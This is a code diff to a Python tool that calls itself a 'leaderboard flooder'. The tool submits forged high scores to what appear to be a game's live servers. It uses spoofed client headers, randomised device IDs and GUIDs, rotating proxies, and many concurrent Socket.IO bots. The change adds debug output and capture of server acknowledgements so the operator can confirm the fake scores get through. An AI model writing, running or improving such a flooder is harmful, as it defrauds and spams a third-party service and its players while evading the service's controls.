@@ -4,6 +4,7 @@ Map list updater + Leaderboard flooder
 - Fetches active maps from https://infocdn.bhoppro.com/ and maintains a local file.
 - Reads that file and sends fake scores for maps with a defined time.
 - Now supports fully automatic mode with --auto.
+- Added --debug to log payloads and server ACK/error responses.
 """
 
 import asyncio
@@ -16,6 +17,7 @@ import random
 import sys
 import re
 import argparse
+import json
 from pathlib import Path
 
 # Try to import BeautifulSoup for robust HTML parsing
@@ -163,11 +165,11 @@ def get_servers_for_map(map_name):
         return []
 
 # ----------------------------------------------------------------------
-# SCORE SENDER (flood logic)
+# SCORE SENDER (flood logic) – UPDATED with ACK capture and debug
 # ----------------------------------------------------------------------
 
 async def send_one_score(bot_id, ip, port, map_name, nick, time_val, score,
-                         proxy_str=None, verbose=False):
+                         proxy_str=None, verbose=False, debug=False):
     guid_full, guid_sub = generate_guid()
     device_id = random_device()
     str_time = f"{int(time_val)//60:02d}:{time_val%60:06.3f}"  # "00:18.285"
@@ -208,6 +210,9 @@ async def send_one_score(bot_id, ip, port, map_name, nick, time_val, score,
         "demoRandom": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=12))
     }
 
+    if debug:
+        print(f"[DEBUG] Bot {bot_id} full payload:\n{json.dumps(payload, indent=2, default=str)}")
+
     connector = aiohttp.TCPConnector(limit=0, force_close=True)
     timeout = aiohttp.ClientTimeout(total=10)
     session_kwargs = {"connector": connector, "timeout": timeout}
@@ -218,8 +223,14 @@ async def send_one_score(bot_id, ip, port, map_name, nick, time_val, score,
     async with aiohttp.ClientSession(**session_kwargs) as session:
         sio.http_session = session
 
+        # Variables to capture server responses
+        ack_data = None
+        error_data = None
+        exception_data = None
+
         @sio.event
         async def connect():
+            nonlocal ack_data
             if verbose:
                 print(f"[+] Bot {bot_id} connected")
             await sio.emit("joinroom", {
@@ -230,9 +241,29 @@ async def send_one_score(bot_id, ip, port, map_name, nick, time_val, score,
                 "guid": guid_full,
                 "guidsub": guid_sub
             })
-            await sio.emit("newscore", payload)
+
+            # Define ACK callback
+            def ack_callback(*args):
+                nonlocal ack_data
+                ack_data = args
+                if verbose or debug:
+                    print(f"[✓] Bot {bot_id} server ACK: {args}")
+
+            # Emit newscore with callback
+            await sio.emit("newscore", payload, callback=ack_callback)
             if verbose:
                 print(f"[✓] Bot {bot_id} sent {nick}: {time_val}s (score {score})")
+
+            # Wait up to 2 seconds for ACK
+            for _ in range(20):
+                if ack_data is not None:
+                    break
+                await asyncio.sleep(0.1)
+
+            if ack_data is None and (verbose or debug):
+                print(f"[!] Bot {bot_id} ACK timeout (no response from server)")
+
+            # Small delay then disconnect
             await asyncio.sleep(0.3)
             await sio.disconnect()
 
@@ -240,6 +271,27 @@ async def send_one_score(bot_id, ip, port, map_name, nick, time_val, score,
         async def disconnect():
             if verbose:
                 print(f"[-] Bot {bot_id} done")
+
+        @sio.event
+        async def error(data):
+            nonlocal error_data
+            error_data = data
+            if verbose or debug:
+                print(f"[!] Bot {bot_id} server error event: {data}")
+
+        @sio.event
+        async def exception(data):
+            nonlocal exception_data
+            exception_data = data
+            if verbose or debug:
+                print(f"[!] Bot {bot_id} server exception event: {data}")
+
+        # Also capture any custom event that might contain a score response
+        # Uncomment and adjust if the server sends something like "score_response"
+        # @sio.event
+        # async def score_response(data):
+        #     if verbose or debug:
+        #         print(f"[✓] Bot {bot_id} score_response: {data}")
 
         try:
             headers = {"User-Agent": "BestHTTP/2 v2.8.4", "Origin": "http://localhost"}
@@ -255,14 +307,14 @@ async def send_one_score(bot_id, ip, port, map_name, nick, time_val, score,
             if verbose:
                 print(f"[!] Bot {bot_id} error: {e}")
 
-async def flood_map(map_name, ip, port, nick, time_val, score, proxies, concurrency, verbose, total_entries):
+async def flood_map(map_name, ip, port, nick, time_val, score, proxies, concurrency, verbose, total_entries, debug=False):
     sem = asyncio.Semaphore(concurrency)
 
     async def worker(i):
         async with sem:
             proxy = random.choice(proxies) if proxies else None
             await send_one_score(i, ip, port, map_name, nick, time_val, score,
-                                 proxy, verbose)
+                                 proxy, verbose, debug)
 
     tasks = [asyncio.create_task(worker(i)) for i in range(total_entries)]
     await asyncio.gather(*tasks)
@@ -273,7 +325,7 @@ async def flood_map(map_name, ip, port, nick, time_val, score, proxies, concurre
 
 def flood_from_file(filepath="maps.txt", auto=False, scores_per_map=5, concurrency=50,
                     nick="MADE BY D4V1 [discord.gg/CkX5MqZXSJ]", score_val=163,
-                    use_proxies=False, server_selection="random"):
+                    use_proxies=False, server_selection="random", debug=False):
     # Read the file
     entries = []
     if not Path(filepath).exists():
@@ -314,7 +366,7 @@ def flood_from_file(filepath="maps.txt", auto=False, scores_per_map=5, concurren
         else:
             proxy_url = None
     else:
-        print(f"[*] Auto mode: using nick='{nick}', score={score_val}, scores_per_map={scores_per_map}, concurrency={concurrency}, proxies={use_proxies}, server_selection={server_selection}")
+        print(f"[*] Auto mode: using nick='{nick}', score={score_val}, scores_per_map={scores_per_map}, concurrency={concurrency}, proxies={use_proxies}, server_selection={server_selection}, debug={debug}")
 
     # Fetch proxies if needed
     proxies = []
@@ -355,7 +407,8 @@ def flood_from_file(filepath="maps.txt", auto=False, scores_per_map=5, concurren
                 map_name, srv['ip'], srv['port'],
                 nick, time_val, score_val,
                 proxies, concurrency, verbose=True,  # you can set verbose False if you want less output
-                total_entries=per_server
+                total_entries=per_server,
+                debug=debug
             ))
 
     print("\n[*] Flooding completed.")
@@ -377,6 +430,7 @@ def main():
     parser.add_argument("--score", type=int, default=163, help="Score value (auto mode)")
     parser.add_argument("--proxies", choices=["yes", "no"], default="no", help="Use proxies? (auto mode)")
     parser.add_argument("--server", choices=["random", "all"], default="random", help="Server selection (auto mode)")
+    parser.add_argument("--debug", action="store_true", help="Enable debug logging (prints full payloads and server responses)")
     args = parser.parse_args()
 
     if args.fetch:
@@ -393,7 +447,8 @@ def main():
             nick=args.nick,
             score_val=args.score,
             use_proxies=(args.proxies == "yes"),
-            server_selection=args.server
+            server_selection=args.server,
+            debug=args.debug
         )
         return
 
@@ -405,7 +460,7 @@ def main():
     if action.lower() in ("f", "fetch"):
         update_maps_file(args.file)
     else:
-        flood_from_file(args.file, auto=False)
+        flood_from_file(args.file, auto=False, debug=args.debug)
 
 if __name__ == "__main__":
     try:
